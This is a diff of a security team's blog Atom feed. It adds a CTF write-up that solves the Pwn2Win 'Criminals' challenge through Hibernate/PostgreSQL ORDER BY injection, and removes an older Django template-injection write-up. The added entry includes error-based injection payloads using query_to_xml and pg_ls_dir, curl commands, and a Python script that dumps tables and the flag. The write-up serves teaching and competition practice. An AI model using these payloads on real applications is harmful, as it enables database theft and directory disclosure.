@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-10-23T16:03:06.736Z</updated>
+  <updated>2017-10-24T06:59:23.807Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -14,6 +14,71 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[Web] Pwn2Win - Criminals</title>
+    <link href="https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/"/>
+    <id>https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/</id>
+    <published>2017-10-24T06:53:16.000Z</published>
+    <updated>2017-10-24T06:59:23.807Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>Criminals<br><br>Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.<br><br><a href="http://200.136.213.109/" target="_blank" rel="external">http://200.136.213.109/</a><br><br>Automated tools are NOT required and NOT allowed.<br><br>Id: criminals<br><br>Total solves: 9<br><br>Score: 363<br><br>Categories: Web<br></blockquote>
+
+<p>This web challenge only has one page and has this form bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/W7HlrKk.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/W7HlrKk.png" alt=""><br></a></p>
+<p>The form has 4 inputs if we test each one of them with a single quote we will notice that an error pops up and we can see the admin of the website did use prepared statements but forgot about the order GET param:<br><a data-fancybox="gallery" href="https://i.imgur.com/a6pb0Ae.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/a6pb0Ae.png" alt=""><br></a><br>Now to solve this challenge we need first to check which <strong>dbms</strong> is running by just checking the error in the image we can see that is running on <strong>HBL</strong> (The Hibernate Query Language), some kind of a modified SQL with some restrictions, before talking about this lets first find which <strong>dbms</strong> is running:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://200.136.213.109/'</span>  --data <span class="string">"name=&amp;age=&amp;crime=&amp;order=abs(1)||2"</span> 2&gt;/dev/null | grep <span class="string">'post'</span></div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: operator does not exist: <span class="built_in">integer</span> || <span class="built_in">integer</span></div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102)</div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835)</div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:388)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdbc2Statement.java:273)</div></pre></td></tr></table></figure>
+<p>With this query we can generate an error that leaks the <strong>dbms</strong> it’s postgresql! now we need to find a way to inject and dump the database, I knew some injections in order by with <strong>mysql</strong> but in <strong>postgresql</strong> is somehow different and what the worst about this are the limitations we got from <strong>HBL</strong>.</p>
+<p>AAfter spending alot of time trying to execute a subquery, I started searching on google, I knew we needed to something related with XML queries (Order by injections in MySql are similar) and then I found this great slides: </p>
+<p><a href="https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf" target="_blank" rel="external">https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf</a><br><a data-fancybox="gallery" href="https://i.imgur.com/IvoeP2v.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/IvoeP2v.png" alt=""><br></a></p>
+<p>This is perfect to put in the <strong>order by query</strong> this will return an integer and we can execute a subquery like we wanted, but the question is how are we going to leaking info? Postgres has a very nice feature, if we cast a string into an integer from a select for example we will generate an error! and the output of that sql query will be printed in the error! For this I used another function called <strong>pg_ls_dir</strong> this can list directories, if we use this to list the current directory and cast it into integer we are going to generate an error, leaking the directory for example:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_upper(xpath ('row', query_to_xml ('<span class="keyword">select</span> <span class="keyword">cast</span>(pg_ls_dir(<span class="keyword">CHR</span>(<span class="number">46</span>))<span class="keyword">as</span> <span class="built_in">int</span>)<span class="string">', true,  false,'')),1)</span></div></pre></td></tr></table></figure>
+<p>The output of this query is:<br><a data-fancybox="gallery" href="https://i.imgur.com/KaRVqJi.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/KaRVqJi.png" alt=""><br></a></p>
+<p>As you can see above we leaked one directory named <strong>pg_xlog</strong> we can do exactly the same but instead of trying to read the log files we can leak the tables like this:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_upper(xpath ('row', query_to_xml ('<span class="keyword">select</span> <span class="keyword">cast</span>(pg_ls_dir((<span class="keyword">SELECT</span> column_name || <span class="keyword">CHR</span>(<span class="number">44</span>) || table_name <span class="keyword">FROM</span> information_schema.columns c <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)) <span class="keyword">as</span> <span class="built_in">int</span>)<span class="string">', true,  false,'')),1)</span></div></pre></td></tr></table></figure>
+<p>The output of this query is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://200.136.213.109/'</span>  --data <span class="string">"name=&amp;age=&amp;crime=&amp;order=array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true,  false,'')),1)"</span> 2&gt;/dev/null | grep <span class="string">'root cause'</span></div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;javax.persistence.PersistenceException: org.hibernate.exception.GenericJDBCException: could not extract ResultSet</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.hibernate.exception.GenericJDBCException: could not extract ResultSet</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: could not open directory &amp;quot;secret,flag&amp;quot;: No such file or directory</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available <span class="keyword">in</span> the Apache Tomcat/8.0.47 logs.&lt;/u&gt;&lt;/p&gt;&lt;hr class=<span class="string">"line"</span>&gt;&lt;h3&gt;Apache Tomcat/8.0.47&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>We just leaked the table flag and the column secret! we can easily write a python script that leaks all the tables and gets the flag for us like this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">host = <span class="string">'http://200.136.213.109/'</span></div><div class="line">data = &#123;<span class="string">'name'</span>:<span class="string">''</span>,<span class="string">'crime'</span>:<span class="string">''</span>,<span class="string">'order'</span>:<span class="string">''</span>,<span class="string">'age'</span>:<span class="string">''</span>&#125;</div><div class="line">query = <span class="string">"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset &#123;&#125;)) as int)', true,  false,'')),1)"</span></div><div class="line">queryflag = <span class="string">"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset &#123;&#125;)) as int)', true,  false,'')),1)"</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">6</span>):</div><div class="line">	<span class="comment">#print x</span></div><div class="line">	data[<span class="string">'order'</span>] = query.format(x)</div><div class="line">	<span class="keyword">print</span> data[<span class="string">'order'</span>]</div><div class="line">	r = requests.post(host, data=data)</div><div class="line">	<span class="keyword">print</span> re.findall(<span class="string">r'&amp;quot;([A-Za-z0-9_\-&#123;&#125;,]+)&amp;quot;'</span>, r.text)</div><div class="line">data[<span class="string">'order'</span>] = queryflag.format(<span class="number">0</span>)</div><div class="line"><span class="keyword">print</span> data[<span class="string">'order'</span>]</div><div class="line">r = requests.post(host,data=data)</div><div class="line"><span class="keyword">print</span> re.findall(<span class="string">r'&amp;quot;([A-Za-z0-9_\-&#123;&#125;]+)&amp;quot;'</span>, r.text)</div></pre></td></tr></table></figure>
+<p>Now running the script:</p>
+<pre><code class="bash">$ python HQLI.py
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'secret,flag'</span>]
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 1)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'id,criminal'</span>]
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 2)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'age,criminal'</span>]
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 3)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'crime,criminal'</span>]
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 4)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'last_location,criminal'</span>]
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 5)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'name,criminal'</span>]
+array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset 0)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
+[u<span class="string">'CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}'</span>]
+</code></pre>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;Criminals&lt;br&gt;&lt;br&gt;Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.&lt;br&gt;&lt;br&gt;&lt;a href
+    
+    </summary>
+    
+      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
+    
+    
+      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
+    
+      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
+    
+      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
+    
+      <category term="hqli" scheme="https://teamrocketist.github.io/tags/hqli/"/>
+    
+      <category term="xmlqueries" scheme="https://teamrocketist.github.io/tags/xmlqueries/"/>
+    
+      <category term="orderby" scheme="https://teamrocketist.github.io/tags/orderby/"/>
+    
+  </entry>
   
   <entry>
     <title>[Pwn] Pwn2Win - Wrong User</title>
@@ -55,11 +120,11 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
@@ -246,11 +311,11 @@ d = []
       <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
     
     
+      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
+    
       <category term="laplace" scheme="https://teamrocketist.github.io/tags/laplace/"/>
     
       <category term="differential" scheme="https://teamrocketist.github.io/tags/differential/"/>
-    
-      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
   </entry>
   
@@ -517,9 +582,9 @@ d = []
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
@@ -576,11 +641,11 @@ d = []
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
     
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
   </entry>
   
@@ -797,11 +862,11 @@ d = []
     
       <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
+    
       <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
     
       <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
-    
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
   </entry>
   
@@ -839,9 +904,9 @@ d = []
     
       <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
-    
       <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
+    
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
   </entry>
   
@@ -928,54 +993,6 @@ d = []
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
       <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Web] CSAW - Shia Labeouf-off</title>
-    <link href="https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/"/>
-    <id>https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/</id>
-    <published>2017-09-17T21:27:02.000Z</published>
-    <updated>2017-09-25T05:07:04.332Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>Web<br>Shia Labeouf-off!<br><br>Do it<br><br>Just do it<br><br>Don’t let your dreams be dreams<br><br>Yesterday you said tomorrow<br><br>So just do it<br><br>Make your dreams come true<br><br>Just do it<br><br>Pick 1: <a href="http://web.chal.csaw.io:5487" target="_blank" rel="external">http://web.chal.csaw.io:5487</a> <a href="http://web.chal.csaw.io:5488" target="_blank" rel="external">http://web.chal.csaw.io:5488</a> <a href="http://web.chal.csaw.io:5489" target="_blank" rel="external">http://web.chal.csaw.io:5489</a> <a href="http://web.chal.csaw.io:5490" target="_blank" rel="external">http://web.chal.csaw.io:5490</a><br></blockquote>
-
-<p>First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.<br>Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception:<br><a data-fancybox="gallery" href="https://i.imgur.com/xSLaeEE.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xSLaeEE.png" alt=""><br></a></p>
-<p>If we scroll down a little bit and check those hidden tabs, we can find some leaked source code!</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/lGE0ewJ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/lGE0ewJ.png" alt=""><br></a></p>
-<p>We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(<code>listme</code>) of a python object one that gets attributes(<code>getme</code>):</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">  <span class="keyword">return</span> getattr(value, arg)</div><div class="line"></div><div class="line"><span class="meta">@register.filter(name='checknum')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checknum</span><span class="params">(value)</span>:</span></div><div class="line">  check(value)</div><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">return</span> dir(value)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">if</span> value &gt; <span class="number">2</span>:</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">"Our infrastructure can't support that many Shias!"</span>)</div></pre></td></tr></table></figure>
-<p>Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;% expressions %&#125;</div><div class="line">&#123;&#123; arg1|filter:arg2 &#125;&#125;</div></pre></td></tr></table></figure>
-<p>we can find one at <a href="http://web.chal.csaw.io:5490/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5490/ad-lib/</a> lets try to see the contents of debug variable:</p>
-<h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/kpSR61D.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/kpSR61D.png" alt=""><br></a></p>
-<h4 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/FGjThVh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/FGjThVh.png" alt=""><br></a></p>
-<p>Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes with the filter <code>listme</code></p>
-<h4 id="Query-1"><a href="#Query-1" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/q2lkMWY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/q2lkMWY.png" alt=""><br></a></p>
-<h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/vfBMY9u.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vfBMY9u.png" alt=""><br></a></p>
-<p>The flag must be in <code><strong>flag</strong></code>!! we need now to get this attribute with <code>getme</code> filter!</p>
-<h4 id="Query-2"><a href="#Query-2" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/yzNX42T.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/yzNX42T.png" alt=""><br></a></p>
-<h4 id="Response-1"><a href="#Response-1" class="headerlink" title="Response"></a>Response</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/adBD7A4.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/adBD7A4.png" alt=""><br></a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;Web&lt;br&gt;Shia Labeouf-off!&lt;br&gt;&lt;br&gt;Do it&lt;br&gt;&lt;br&gt;Just do it&lt;br&gt;&lt;br&gt;Don’t let your dreams be dreams&lt;br&gt;&lt;br&gt;Yesterday you said tom
-    
-    </summary>
-    
-      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
-    
-    
-      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
-    
-      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
-    
-      <category term="django" scheme="https://teamrocketist.github.io/tags/django/"/>
-    
-      <category term="ssti" scheme="https://teamrocketist.github.io/tags/ssti/"/>
-    
-      <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
     
   </entry>
   
